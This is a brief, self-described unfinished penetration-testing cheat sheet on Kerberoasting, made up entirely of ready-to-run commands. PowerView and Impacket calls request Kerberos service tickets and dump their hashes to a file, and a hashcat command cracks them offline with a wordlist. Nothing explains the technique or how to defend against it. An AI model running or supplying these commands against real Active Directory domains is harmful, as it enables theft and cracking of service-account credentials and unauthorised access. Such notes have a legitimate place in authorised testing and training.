# Kerberoasting

Kerberoasting (STILL WORKING ON THIS)

```
Get-DomainSPNTicket -Credential $cred -OutputFormat hashcat

Invoke-Kerberoast -OutputFormat Hashcat
Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'C:\Users\Administrator\Music\hash_capture.txt' -Width 8000

GetUserSPNs.py <domain>/<username>:<password> -dc-ip <DC IP> -request
hashcat -m 13100 -a 0 spn.txt /usr/share/wordlists/rockyou.txt
```
